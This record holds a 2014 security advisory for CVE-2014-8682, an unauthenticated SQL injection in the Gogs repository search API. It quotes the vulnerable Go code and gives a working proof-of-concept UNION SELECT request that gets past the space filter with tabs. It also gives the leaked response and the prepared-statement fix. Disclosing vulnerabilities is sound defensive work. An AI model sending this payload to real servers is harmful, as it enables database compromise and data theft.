{
    "text": "title : Gogs Repository Search SQL Injection  ， detail : Gogs suffers from a remote unauthenticated SQL injection vulnerability via repository search. Versions 0.3.1-9-g49dc57e through 0.5.6.1104-g0c5ba45 are affected.  ， cve : advisories | CVE-2014-8682  ，  ， desc : -BEGIN PGP SIGNED MESSAGE-  ， Hash : RIPEMD160  ， Unauthenticated SQL Injection in Gogs repository search  ，  ， Researcher : Timo Schmid <tschmid @ ernw.de>  ， Description  ，  ， Gogs ( Go Git Service ) is a painless self-hosted Git Service written in  ， Go. ( taken  ， from [ 1 ]  )   ， It is very similiar to the github hosting plattform. Multiple users can  ， create  ， multiple repositories and share code with others with the git version  ， control  ， system. Repositories can be marked as public or private to prevent  ， access from  ， unauthorized users.  ， Gogs provides an api view to give javascript code the possibility to  ， search for  ， existing repositories in the system. This view is accessible at  ， /api/v1/repos/search?q=<search query>.  ， The q Parameter of this view is vulnerable to SQL injection.  ， Exploitation Technique  ，  ， Remote  ， Severity Level  ，  ， Critical  ， CVSS Base Score  ，  ， 8.3 ( AV : N / AC : M / Au : N / C : C / I : P / A : P )   ， CVE-ID  ，  ， CVE-2014-8682  ， Impact  ，  ， The vulnerability results at least in a complete compromise of the database.  ， Depending on the particular database configuration a compromise of the  ， system  ， is also possible.  ， Status  ，  ， Fixed by Vendor  ， Vulnerable Code Section  ，  ， models/repo.go :   ，  [ . ]   ， / SearchRepositoryByName returns given number of repositories whose name  ， contains keyword.  ， func SearchRepositoryByName ( opt SearchOption )  ( repos [  ]  * Repository , err  ， error ) {  ， / Prevent SQL inject.  ， opt.Keyword = FilterSQLInject ( opt.Keyword )   ，   ， }  ， opt.Keyword = strings.ToLower ( opt.Keyword )   ， repos = make (  [  ]  * Repository , 0 , opt.Limit )   ， / Append conditions.  ， sess : = x.Limit ( opt.Limit )   ，  ， sess.Where ( \"owner_id=?\" , opt.Uid )   ， }  ，  ， sess.And ( \"is_private=false\" )   ， }  ， sess.And ( \"lower_name like '%\" + opt.Keyword + \"%'\" ) .Find ( &repos )   ，  ， }  ，  [ . ]   ， The vulnerability exists because of a string concatination in the SQL  ， query with  ， user supplied data. Because of the SQL filter at the method entry , attackers  ， can't use spaces ( 0x20 ) and since v0.5.6.1025-g83283b commas are also  ， filtered.  ， Proof of Concept  ，  ， Request :   ， http : /www.example.com/api/v1/repos/search?q=%27 ) %09UNION%09SELECT%09 * %09FROM%09  ，  ( SELECT%09null ) %09AS%09a1%09%09JOIN%09 ( SELECT%091 ) %09as%09u%09JOIN%09 ( SELECT%09  ， user (  ) %09AS%09b1%09JOIN%09 ( SELECT%09user (  ) %09AS%09b2%09JOIN%09 ( SELECT%09null )   ， %09as%09a3%09%09JOIN%09 ( SELECT%09null ) %09as%09a4%09%09JOIN%09 ( SELECT%09null ) %09  ， as%09a5%09%09JOIN%09 ( SELECT%09null ) %09as%09a6%09%09JOIN%09 ( SELECT%09null ) %09as  ， %09a7%09%09JOIN%09 ( SELECT%09null ) %09as%09a8%09%09JOIN%09 ( SELECT%09null ) %09as%09  ， a9%09JOIN%09 ( SELECT%09null ) %09as%09a10%09JOIN%09 ( SELECT%09null ) %09as%09a11%09  ， JOIN%09 ( SELECT%09null ) %09as%09a12%09JOIN%09 ( SELECT%09null ) %09as%09a13%09%09JOIN  ， %09 ( SELECT%09null ) %09as%09a14%09%09JOIN%09 ( SELECT%09null ) %09as%09a15%09%09JOIN  ， %09 ( SELECT%09null ) %09as%09a16%09%09JOIN%09 ( SELECT%09null ) %09as%09a17%09%09JOIN  ， %09 ( SELECT%09null ) %09as%09a18%09%09JOIN%09 ( SELECT%09null ) %09as%09a19%09%09JOIN  ， %09 ( SELECT%09null ) %09as%09a20%09%09JOIN%09 ( SELECT%09null ) %09as%09a21%09%09JOIN  ， %09 ( SELECT%09null ) %09as%09a22%09where%09 ( %27%25%27=%27  ， Response :   ， {\"data\" :  [ {\"repolink\" : \"bluec0re/test\"} , {\"repolink\" : \"bluec0re/secret\"} , {\"repolink\"  ，  : \"bluec0re/root @ localhost\"} ]  , \"ok\" : true}  ， Solution  ，  ， This vulnerability could easily be fixed by using prepared statements :   ， sess.And ( \"lower_name like ?\" , \"%\" + opt.Keyword + \"%\" ) .Find ( &repos )   ， Update to version 0.5.6.1105.  ， Affected Versions  ，  ， >= v0.3.1-9-g49dc57e  ， <= v0.5.6.1104-g0c5ba45",
    "time": "Nov 14, 2014"
}